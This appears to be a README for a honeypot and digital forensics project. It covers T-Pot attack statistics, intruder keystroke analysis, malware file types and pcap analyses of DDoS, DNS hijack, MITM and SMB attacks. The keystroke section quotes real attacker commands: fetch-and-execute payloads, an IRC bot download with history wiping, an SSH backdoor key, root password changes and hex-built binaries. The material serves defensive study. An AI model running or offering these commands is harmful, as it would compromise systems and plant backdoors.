# Project: HoneyNet and DFIR

## Project Overview

This project encompasses the strategic deployment of honeypots to capture malware files and monitor hacker activities. The data collected from these honeypots undergo thorough analysis within the Digital Forensic Lab, operating within the framework of Digital Forensics and Incident Response (DFIR). Furthermore, the Digital Forensic Lab examines hacking patterns generated within the Penetration Testing Lab in the [Pentest project](https://github.com/alanshlam/Pentest), enabling comprehensive studies and investigations.

Furthermore, the Digital Forensic Lab serves as a hub for studying and understanding hacking patterns that are generated within the Penetration Testing Lab and collected from Honeypots. These hacking patterns serve as valuable resources for our forensic analysts, enabling them to gain a deeper understanding of the evolving tactics employed by malicious actors. By closely examining these patterns, we can identify recurring trends, emerging attack vectors, and potential vulnerabilities that require immediate attention.

The synergy between the Penetration Testing Lab and the Digital Forensic Lab is instrumental in enhancing our overall cybersecurity posture. The insights gained from the analysis of honeypot data and hacking patterns enable us to refine our penetration testing methodologies, develop targeted countermeasures, and improve incident response capabilities. This iterative process ensures that our defensive strategies are continuously evolving to keep pace with the ever-changing threat landscape.

## Findings and Studies

### T-Pot Honeypot Deployment

We have deployed the T-Pot honeypot on a cloud platform to collect malware files and monitor hacker activities. The following screenshot provides an overview of the [top 10 attacks](./data/Honeypot%20Attacks%20-%20Top%2010.csv), [attack map](./screenshot/Attack_Map_Dynamic.jpg), [attackers' source IP](./data/Attacker%20Source%20IP%20-%20Top%2010.csv), [Attacks by Country and Port](./data/Attacks%20by%20Country%20and%20Port.csv),  [attackers' OS distribution](./data/P0f%20OS%20Distribution.csv), [attackers by country](./data/Attacks%20by%20Country.csv), [username](./data/Username%20Tagcloud.csv) and [password](./data/Password%20Tagcloud.csv) tag cloud, [attackers' autonomous systems (AS)](./data/Attacker%20AS_N%20-%20Top%2010.csv), [detected Common Vulnerabilities and Exposures (CVE)](./data/Suricata%20CVE%20-%20Top%2010.csv), and [Suricata IDS alerts](./data/Suricata%20Alert%20Signature%20-%20Top%2010.csv) over the past 4 weeks.

The statistical data from T-Pot Honeypots is also available in CSV format in the [data_folder](./data/).

<div align="left">
    <img src="./screenshot/T-pot.jpg" alt="TPot" width="1000">
</div>

### T-Pot Honeypot Usage

The video below shows how to use the T-Pot honeypot to collect malware files and monitor hacker activities.

[<img src="./screenshot/T-Pot2.jpg" width="500">](https://www.youtube.com/watch?v=918dgVJLqgU)

(https://www.youtube.com/watch?v=918dgVJLqgU)

### T-Pot Attack Map

The videos below shows the T-Pot Attack Map in two minutes. 

<img src="./screenshot/a-map2.jpg" width="500">

The video below demonstrates that an attacker from Brazil continuously attacked the honeypot's SMB.

(https://www.youtube.com/watch?v=y5aF4Ea5r6Q)

The video below demonstrates that an attacker from Vietnam continuously attacked the honeypot's SMB.

(https://www.youtube.com/watch?v=ff_2JJN1Pt8)



### Hacker Activities and Keystroke Analysis

A total of 6,420 hacker keystroke sessions have been recorded following their break-ins, encompassing 133,694 lines of keystrokes. The common activities performed by hackers after breaking into systems include:

- **Probing Victim Host Information:** Gathering details such as IP address, OS version, installed software, CPU, memory, and disk size. E.G.
    ```bash
    df -h | head -n 2 | awk 'FNR == 2 {print $2;}'lscpu | grep Modelwhoamiuname -aunametopcat /proc/cpuinfo | grep model | grep name | wc -luname -mwcrontab -lls -lh $(which ls)free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'cat /proc/cpuinfo | grep name | head -n 1
    lscpu | grep "CPU(s):                " 
    ```
- **Check enabled built-ins**  check enabled built-ins commands on the victim host. E.G.
    ```bash
    root@ubuntu:~# enable
    enable .
    enable :
    enable [
    enable alias
    enable bg
    enable bind
    enable break
    enable builtin
    enable caller
    enable cd
    enable command
    enable compgen
    enable complete
    
    ```

- **Modifying Credentials:** Changing the root password or creating other root accounts. E.G.
    ```bash
    echo "root:ZYOYI3d9rSGq"|chpasswd|bash
    echo -e "new_password\nnew_password"|passwd|bash
    ```
- **Downloading Files:** Using tools like `wget`, `ftp`, or `curl` to download files and attempting to execute them. E.G.
    ```bash
    wget http://[IP]:25770/.i; chmod 777 .i; ./.i
    ```
- **Creating Binary Files:** Using echo hex code to create binary files and attempting to execute them. E.G.
    ```bash
    echo -ne "\x7f\x45\x4c\x46\x01\x02\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x08\x00\x00\x00\x01\x00\x40\x00\xb0\x00\x00\x00\x34\x00\x00\x01\x64\x00\x00\x10\x06\x00\x34\x00\x20\x00\x02\x00\x28\x00\x03\x00\x02\x70\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" >> .s
    ```
- **Installing Trojan Programs:** Installing trojan horse programs.
- **Establishing Backdoors:** Appending public keys to the `authorized_keys` file for SSH access. E.G.
    ```bash
    cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~echo "123456\nO9O7RwyNaHwh\nO9O7RwyNaHwh\n"|passwd echo "root:8ufW8KmuglZC"|chpasswd|bash
    ```
- **Setting Up Proxy Servers:** Configuring IRC proxies, botnet command and control channels. E.G.
    ```bash
    cd /tmp ; wget [ip]/irc.pl ; perl irc.pl ; rm -rf irc.pl ; curl -O [ip]/irc.pl ; perl irc.pl ; rm -rf irc.pl ; history -cls /homecommand -v curl
    ```
- **Running DDoS Attacks:** Conducting Distributed Denial of Service (DDoS) attacks.
- **Mining Cryptocurrency:** Running cryptocurrency mining operations.

### Downloaded Files Analysis

We have archived 210 unique files downloaded by hackers. Below is the distribution of these file types:

| File Type                 | Percentage |
|---------------------------|------------|
| Executable Binary         | 46%        |
| ASCII Text                | 22%        |
| Data                      | 17%        |
| Shell Script              | 7%         |
| Gzip Compressed Data      | 7%         |
| OpenSSH RSA Public Key    | 1%         |

<div align="left">
<img src="./screenshot/file_type_pie.jpg" alt="VirusTotal" width="500">
</div>


Most of these files, except for some recent downloads or short shell scripts, can be identified by various antivirus agents on VirusTotal. These files are primarily classified as Trojan horses, DDoS tools, and CoinMiners.

Below screenshot shows the Virustotal hash search of a download file 
<div align="left">
    <img src="./screenshot/virustotal.jpg" alt="VirusTotal" width="1000">
</div>



You can view the hash and file type of these downloaded files at [here](./data/dl_file_hash.txt).

## Network Forensics

In the Penetration Testing Lab, various hacking techniques have been studied, and their corresponding attack network packets have been recorded in PCAP files. Below, we provide an analysis of some of these attack network packets using Wireshark and tcpdump tools.

### Attack Network Packet Analysis

#### 1. DDoS Attack  ([ddos.pcap](./pcap/ddos.pcap))

This pcap file contains 5000 ICMP Smurf DDoS attack network packets directed at a victim. The attacker launched over 30 source-spoofed IP ICMP packets to the victim in one millisecond.

 <img src="./screenshot/DDoS.jpg" alt="DDoS" width="1000">
 
#### 2. DNS Hijack Attack  ([dns_hijack.pcap](./pcap/dns_hijack.pcap))

This pcap file captures DNS hijack attack network packets. The analysis shows that fake DNS reply packets from the attacker always reach the victim host earlier than the authentic DNS reply packets from the genuine DNS server. These fake DNS reply packets redirect the victim to a phishing website. The attacker also launched a DoS attack on the genuine DNS server to slow down its reply packets to the victim host.

 <img src="./screenshot/dns_hijack.jpg" alt="dns hijack" width="1000">
 
#### 3. Man-in-the-Middle Attack  ([mitm.pcap](./pcap/mitm.pcap))

This pcap file records network packets of HTTPS interception by a MITM attack via ARP poisoning. Normally, HTTPS network packets are encrypted by a session key between the client and web server. An attacker cannot decrypt the HTTPS traffic without the session key. However, if the attacker can redirect the victim's HTTPS traffic to their managed host (e.g., by DNS hijack or ARP poisoning in a LAN), they can supply their own session key to the victim host, decrypt the HTTPS traffic, and relay the HTTPS traffic between the victim host and the genuine web server.

<img src="./screenshot/mitm.jpg" alt="MITM" width="1000">

The video below demostrate how an attacker can sniff victim account passwords by intercepting HTTPS traffic in a MITM attack:
(https://www.youtube.com/watch?v=E_E2cYAhyiU&t=18s)


#### 4. SMB Break-in ([smb.pcap](./pcap/smb.pcap))

This pcap file captures Server Message Block (SMB) network packets post-break-in. These packets record the attacker's commands after the break-in. By examining these network packets, we can reconstruct the attacker's activities.

<img src="./screenshot/smb.jpg" alt="SMB" width="1000">


#### You can download the above pcap files at [here](./pcap/)

#### The video below demonstrate how we use Wireshark and tcpdump tools to analyze the above-recorded network packets:
(https://www.youtube.com/watch?v=mpGF8-iyuhw&t=110s)



## Future Work
- **AI Integration:** Utilize AI technologies to automate the analysis and categorization of data gathered from honeypots during the initial stages of Digital Forensics and Incident Response (DFIR) investigations. This integration will streamline the process and enable efficient examination of the collected data, aiding in the identification of potential threats and patterns.
- **Knowledge Base Development:** Establish a comprehensive knowledge base for this project by leveraging large language models (LLMs). Collaborate on the [LLM knowledge base project](https://github.com/alanshlam/LLM) to accumulate and consolidate valuable expertise. This collaborative effort will ensure the knowledge base remains up-to-date and serves as a valuable resource for the team.
- **Enhance Digital Forensic Lab:** Strengthen the capabilities of the Digital Forensic Lab to conduct thorough static and dynamic analysis of collected malware. By investing in advanced tools and technologies, the lab will be better equipped to extract critical information and gain deeper insights from malware samples, aiding in investigations and response efforts.
- **Develop Analytical Tools:** Create specialized tools to analyze the relationship between the time gap of malware collection and the release of vulnerabilities (e.g., the latest CVEs). Focus on studying the frequency of zero-day attacks and their correlation with vulnerabilities. These tools will provide valuable insights into the effectiveness of existing security measures and inform proactive defense strategies.
- **Expand Honeypot Deployment:** Expand the deployment of honeypots across different regions to gather a broader set of data. By comparing the collected data from various regions, it will be possible to identify regional variations in hacker activities and tactics. This understanding can contribute to the development of targeted security measures and enhance overall threat intelligence.

By undertaking these future initiatives, we aim to bolster our DFIR capabilities, enhance our understanding of emerging threats, and strengthen our overall cybersecurity posture.
